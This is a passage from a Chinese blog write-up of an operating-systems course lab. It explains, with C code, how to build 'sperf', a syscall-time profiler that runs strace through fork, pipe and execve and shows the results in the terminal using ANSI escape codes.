precompiled pattern buffer, preg will free the memory allocated to the pattern buffer by the compiling process, regcomp().</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>  可以看到，首先需要进行正则表达式的预编译，然后再执行匹配过程，最后释放掉预编译所占用的空间。具体的细节可以查看手册了解</p><p>  当然，在解析strace的输出时，会遇到一些小麻烦，如下所示</p><ol><li><strong>strace</strong>默认会将<strong>trace</strong>输出到<strong>stderr</strong>中。但如果<strong>strace</strong>追踪的程序同样输出到<strong>stderr</strong>，则会对解析<strong>strace</strong>的输出产生一些麻烦</li><li>即使解决了上面的问题(例如将程序的<strong>stderr</strong>重定向到<strong>/dev/null</strong>丢弃)，程序输出的字符串同样可能对解析产生麻烦，如下所示<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ strace -T <span class="built_in">echo</span> -n <span class="string">&#x27;&quot;, 1) = 100 &lt;99999.9&gt;&#x27;</span> &gt; /dev/null</span><br><span class="line">ioctl(1, TCGETS, 0x7fff80723570)        = -1 ENOTTY &lt;0.000100&gt;</span><br><span class="line">write(1, <span class="string">&quot;\&quot;, 1) = 100 &lt;99999.9&gt;&quot;</span>, 21)  = 21 &lt;0.000149&gt;</span><br><span class="line">close(1)                                = 0 &lt;0.000126&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="图形化展示"><a href="#图形化展示" class="headerlink" title="图形化展示"></a>图形化展示</h3><p>  最后，当我们获取了每个系统调用所花的总时间后，就可以使用<a href="https://notes.burke.libbey.me/ansi-escape-codes/">ANSI Escape Code</a>，打印出一张图形化界面——只需要每个一段时间使用ANSI Escape Code清一下屏幕即可</p><p>  额外说明一下，实际上，在学会使用<strong>Escape Code</strong>之后，就打开了一扇新的大门，只需要两个额外的API，既可以实现任何有趣的东西</p><ol><li>准确的定时器;</li><li>能够即刻捕获终端按键的API</li></ol><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  直接按照实验手册上的说明，从github上继续拉取<strong>M3</strong>实验即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add jyy https://hub.fastgit.org/NJU-ProjectN/os-workbench.git &amp;&amp; git checkout master &amp;&amp; git pull jyy L2</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其实现，<a href="https://gitee.com/jiaweihawk/nju-os/tree/12ae83779c9299497de8b9acdbf6e6d947774802">实验实现</a></p><h3 id="解析COMMAND、ARG和环境变量"><a href="#解析COMMAND、ARG和环境变量" class="headerlink" title="解析COMMAND、ARG和环境变量"></a>解析COMMAND、ARG和环境变量</h3><p>  对于COMMAND，根据实验手册可知，其是第一个参数，即<strong>main</strong>的<code>argv[1]</code>为COMMAND。实际上其并不需要进行解析——因为我们会调用<code>execve(/path/to/strace, sperf_args, sperf_env)</code>，实际上<strong>sperf_args[1]</strong>的值就是COMMAND。那么只要我们传递正确的<strong>sperf_env</strong>，则执行execve的时候，其会自动进行解析</p><p>  对于ARG，实际上就是<code>argv[2:]</code>,其中<strong>argv[0] == sperf</strong>,<strong>argv[1] == COMMAND</strong>;另一方面，由于我们还需要输出系统调用的时间信息，即我们还需要在额外添加<strong>-T</strong>参数；最后，为了避免<strong>strace</strong>的输出和<strong>strace</strong>追踪的程序的输出混合，我们还需要参数<strong>-o</strong>、<strong>/proc/<code>pid</code>/fd</strong>来直接指定strace的输出</p><p>  最后则是环境变量，实际上根据手册<code>man 7 environ</code>可知，其是操作系统直接定义好的变量，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">The variable environ points to an array of pointers to strings called the &quot;environment&quot;.  The last pointer in this array has the value NULL.  (This variable must be declared in the user pro‐</span></span><br><span class="line"><span class="comment">       gram, but is declared in the header file &lt;unistd.h&gt; if the _GNU_SOURCE feature test macro is defined.)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><br>  因此，我们不需要更多的解析，直接使用即可</p><p>  最后，解析COMMAND、ARG和环境变量部分的代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// strace显示系统调用时间的参数</span></span><br><span class="line"><span class="type">char</span> *STRACE_SHOW_TIME = <span class="string">&quot;-T&quot;</span>, *STRACE_OUTPUT = <span class="string">&quot;-o&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc中定义好的环境变量</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 实际上glibc已经提前解析好环境变量，不需要过多在进行解析</span></span><br><span class="line"><span class="comment"> * 对于参数，只需要添加-T,显示具体的系统调用的时间即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> **<span class="title function_">parse_args_environ</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="type">char</span> **exec_arg = (<span class="type">char</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>*) * (argc + <span class="number">4</span>));</span><br><span class="line">assert(exec_arg &amp;&amp; argv);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//exec_arg[0] = STRACE_PATH, exec_arg[1] = STRACE_SHOW_TIME, exec_arg[2] = &quot;-o&quot;, exec_arg[3] = /proc/`pid`/fd, exec_arg[4:] = argv[1:]</span></span><br><span class="line"><span class="comment">//首先直接复制原始的argv即可，之后会用strace的路径替换exec_arg[0],因此没有必要进行复制</span></span><br><span class="line">exec_arg[<span class="number">1</span>] = STRACE_SHOW_TIME;</span><br><span class="line">exec_arg[<span class="number">2</span>] = STRACE_OUTPUT;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= argc; ++i) &#123; exec_arg[i + <span class="number">3</span>] = argv[i]; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> exec_arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="fork创建子进程"><a href="#fork创建子进程" class="headerlink" title="fork创建子进程"></a>fork创建子进程</h3><p>  实际上，也就是创建新进程，一个进程用来执行<strong>/path/to/strace -T -o /proc/<code>pid</code>/fd COMMAND arg</strong>，即不断输出系统调用的相关情况；另一个进程用来分析上一个进程的输出，并对其解析，然后通过图形化界面进行表示即可</p><p>  这一部分的工作很简单，就是通过<strong>fork</strong>生成新的进程，其中为了方便，子进程(返回值为0的进程)作为前面介绍的第一个进程进行执行；而父进程(返回值为1的进程)自然作为后一个进程进行执行即可。<br>  需要说明的是，由于之后涉及两个进程之间的通信，因此需要首先调用<strong>pipe</strong>，生成一端读、一端写的管道。然后<strong>fork</strong>后，两个进程都继承了管道文件描述符，则可以通过管道进行通信——这里子进程只涉及输出信息，因此其可以关闭用来读取的文件描述符，然后将<strong>stderr</strong>重定向到管道的输出文件描述符上即可;类似的，对于父进程，其只需要从用来读取的文件描述符中读入数据即可。这部分的代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//管道文件描述符，用来进程间通信</span></span><br><span class="line"><span class="type">int</span> pipefd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提前创建管道文件描述符，用来之后进程间通信</span></span><br><span class="line"><span class="keyword">if</span>(pipe(pipefd) == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建新进程，其中子进程用来执行/path/to/strace -T -o /proc/`pid`/fd</span></span><br><span class="line"><span class="keyword">switch</span>(fork()) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">child(argc, argv);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">parent();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 理论上，child由于执行execve，则其不会返回，即不可能执行到这里</span></span><br><span class="line"><span class="comment"> * parent由于在read系统调用异常时，会直接返回，也不可能执行到这里</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, <span class="string">&quot;sperf wrong return&quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="子进程execve调用strace"><a href="#子进程execve调用strace" class="headerlink" title="子进程execve调用strace"></a>子进程execve调用strace</h3><p>  下面具体说明一下子进程的函数逻辑<br>  首先，子进程仅仅需要将<strong>strace</strong>的结果输出到管道的写入部分，因此其首先关闭管道的读文件描述符。<br>  其次，其需要解析<strong>COMMAND</strong>和<strong>arg</strong>，这个在前面已经简单介绍过了。但是这里需要设置<strong>arg[0]</strong>和<strong>arg[3]</strong>，一个是<strong>strace</strong>的路径，这个在下面的步骤中会提及；另一个是子进程的写管道文件描述符，由于<strong>strace</strong>默认输出到<strong>stdout</strong>，可能和程序输出混合，因此将其重定向到<strong>/proc/<code>pid</code>/fd</strong>(一开始思想太僵化，看到了<strong>-o</strong>可以指定<strong>strace</strong>输出文件，但是没有和<strong>procfs</strong>联系起来，这里是看了<strong>jyy</strong>老师的github才明白，还是太菜了😢)<br>  最后，为了获取有效的<strong>strace</strong>路径信息，则我们需要依次使用<code>execve</code>实验<strong>PATH</strong>环境变量，找到其有效路径。通过查阅手册<code>man 3 getenv</code>可知，可以通过<strong>getenv</strong>函数获取环境变量，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">getenv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">The getenv() function searches the environment list to find the environment variable name, and returns a pointer to the corresponding value string.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>  Linux中PATH变量通过<strong>:</strong>进行分割，因此我们只需要根据<strong>:</strong>切割获取的环境变量，并依次遍历这些路径，执行<strong>execve</strong>则可以找到<strong>strace</strong>文件所在的路径。这部分的代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 子进程部分</span></span><br><span class="line"><span class="comment"> * 其用来执行/path/to/strace -T -o /proc/`pid`/fd command arg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">child</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> fd_path[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;, strace_path[MAX_STRACE_OUTPUT_SIZE] = &#123;<span class="number">0</span>&#125;; <span class="comment">// Linux中路径长度最大不超过MAX_STRACE_OUTPUT_SIZE字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 首先关闭读管道文件描述符</span></span><br><span class="line">close(pipefd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取部分参数</span></span><br><span class="line"><span class="type">char</span> **exec_arg = parse_args_environ(argc, argv);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取exec_arg[3], 即当前进程的写管道描述符</span></span><br><span class="line">exec_arg[<span class="number">3</span>] = fd_path;</span><br><span class="line"><span class="built_in">sprintf</span>(fd_path, <span class="string">&quot;/proc/%d/fd/%d&quot;</span>, getpid(), pipefd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//开始根据环境变量中的PATH值进行切割和测试，从而获取strace的路径信息和exec_arg[0]</span></span><br><span class="line">exec_arg[<span class="number">0</span>] = strace_path;</span><br><span class="line"><span class="type">int</span> pathBegin = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *path = getenv(<span class="string">&quot;PATH&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(path[i]) &#123;</span><br><span class="line"><span class="keyword">while</span>(path[i] &amp;&amp; path[i] != PATH_SPLIT) &#123; ++i; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时path[pathBegin: i - 1]就是待检测的路径</span></span><br><span class="line"><span class="built_in">strncpy</span>(strace_path, path + pathBegin, i - pathBegin);</span><br><span class="line"><span class="built_in">strncpy</span>(strace_path + i - pathBegin, STRACE_EXECUTE, <span class="keyword">sizeof</span>(STRACE_EXECUTE) +<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">execve(strace_path, exec_arg, environ);<span class="comment">//如果正确执行，则不会返回，并且将strace输出到写管道描述符</span></span><br><span class="line"></span><br><span class="line">pathBegin = ++i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果执行了execve，则理论上不会执行到这里——也就是如果执行到了这里，必然是execve没有正确执行</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, <span class="string">&quot;execve() could not find strace&quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="父进程获取管道输出"><a href="#父进程获取管道输出" class="headerlink" title="父进程获取管道输出"></a>父进程获取管道输出</h3><p>  对于父进程来说，这部分的任务可以简单分为两部分——从读管道文件描述符中读取子进程的输出、使用正则表达式解析该输出并进行结果统计<br>  第一个任务还是比较简单的——只需要循环调用<code>read</code>读取管道符即可。这里面有几个小细节:</p><ol><li>设置缓冲区大小。我们并不知道子进程每次输出的大小，理论上应该使用动态数组进行存储。这里为了简单<del>懒得实现</del>，直接固定长度<strong>4192</strong>个字节即可</li><li>注意<strong>read</strong>的结果，我们需要<strong>read</strong>命令的结果，判断子进程的状态<br>根据<code>man 3 read</code>，首先，将读管道文件描述符设置为<strong>O_NONBLOCK</strong>，从而可以根据<strong>read</strong>的结果判断子进程调用<ul><li>如果<strong>read</strong>结果等于-1，则表示子进程未结束，但是当前子进程无输出</li><li>如果<strong>read</strong>结果等于0，则表示子进程已经结束<ul><li>如果<strong>read</strong>结果大于0，则表明子进程正常输出</li></ul></li></ul></li></ol><p>  这一部分的最终代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TIME_INTERVAL_SECONDS (1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_STRACE_OUTPUT_SIZE (4095)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 父进程部分</span></span><br><span class="line"><span class="comment"> * 其解析子进程的管道输出，并且以GUI的形式展示输出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">parent</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">char</span> buf[MAX_STRACE_OUTPUT_SIZE + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> read_result = <span class="number">0</span>, buf_available = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭无用的写管道文件描述符</span></span><br><span class="line">close(pipefd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置读管道文件描述符为非阻塞模式</span></span><br><span class="line"><span class="keyword">if</span>(fcntl(pipefd[<span class="number">0</span>], F_SETFD, fcntl(pipefd[<span class="number">0</span>], F_GETFD) | O_NONBLOCK) == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化解析字符串中正则匹配相关模式</span></span><br><span class="line">parse_strace_output_init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//可能子进程确实没有输出，或子进程终止，需要辨别这两种情况</span></span><br><span class="line"><span class="keyword">switch</span>(read_result = read(pipefd[<span class="number">0</span>], buf + buf_available, MAX_STRACE_OUTPUT_SIZE - buf_available)) &#123;</span><br><span class="line"><span class="comment">//子进程当前没有输出，但未终止</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//子进程当前终止</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//此时子进程和父进程正常通过管道进行通信</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">buf[buf_available + read_result] = <span class="number">0</span>;</span><br><span class="line">buf_available = parse_strace_output(buf, buf_available + read_result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 节省资源，休眠TIME_INTERVAL_SECONDS秒</span></span><br><span class="line">sleep(TIME_INTERVAL_SECONDS);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="父进程解析管道输出"><a href="#父进程解析管道输出" class="headerlink" title="父进程解析管道输出"></a>父进程解析管道输出</h3><p>  首先，需要考虑如何统计管道输出。这里需要三个数据结构——一个统计系统调用名称及其消耗时间的数据结构、一个按照系统调用名称排序的数组和一个按照消耗时间排序的数组，并保持相关的排序顺序不变，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 用来统计系统调用的信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_SIZE(400)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SYSCALL_INFO</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *syscall;</span><br><span class="line"><span class="type">int</span> syscall_name_size;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> time;</span><br><span class="line">&#125; Syscall_Info;</span><br><span class="line">Syscall_Info *syscall_info_sort_by_name[SYSCALL_SIZE] = &#123;<span class="literal">NULL</span>&#125;, *syscall_info_sort_by_time[SYSCALL_SIZE] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">int</span> syscall_info_number = <span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> syscall_time_total = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>  既然有了上面的系统调用统计信息的数据结构，则自然需要实现基于该数据结构的操作——即每解析一条输出，增加一次相关系统调用的统计信息，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据系统调用字符串，查找syscall_info_sort_by_name数组，从而获取字符串数组所在的下标</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">syscall_info_find_idx_by_name</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span> &#123;</span><br><span class="line"><span class="type">int</span> left = <span class="number">0</span>, right = syscall_info_number - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line"><span class="type">int</span> middle = left + (right - left) / <span class="number">2</span>, cmp = <span class="built_in">strcmp</span>(syscall_info_sort_by_name[middle]-&gt;syscall, name);</span><br><span class="line"><span class="keyword">if</span>(cmp == <span class="number">0</span>) &#123; <span class="keyword">return</span> middle; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(cmp &lt; <span class="number">0</span>) &#123; left = middle + <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; right = middle - <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据系统调用，排序名称或者消耗时间</span></span><br><span class="line"><span class="comment"> * 快排</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_info_sort_by_name_sort() _syscall_info_qsort(syscall_info_sort_by_name, 0, syscall_info_number - 1, syscall_info_sort_by_name_cmp)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_info_sort_by_time_sort() _syscall_info_qsort(syscall_info_sort_by_time, 0, syscall_info_number - 1, syscall_info_sort_by_time_cmp)</span></span><br><span class="line"><span class="type">void</span> _syscall_info_qsort(Syscall_Info **base, <span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> (*cmp)(Syscall_Info **base, <span class="type">int</span> i, <span class="type">int</span> j)) &#123;</span><br><span class="line"><span class="keyword">if</span>(left &gt;= right) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> leftIndex = left, rightIndex = right + <span class="number">1</span>;</span><br><span class="line">Syscall_Info *temp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">while</span>((*cmp)(base, left, ++leftIndex) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(leftIndex == right) &#123; <span class="keyword">break</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为了确保正确性，不能为等号，否则rightIndex可能取到left - 1</span></span><br><span class="line"><span class="keyword">while</span>((*cmp)(base, left, --rightIndex) &lt; <span class="number">0</span>) 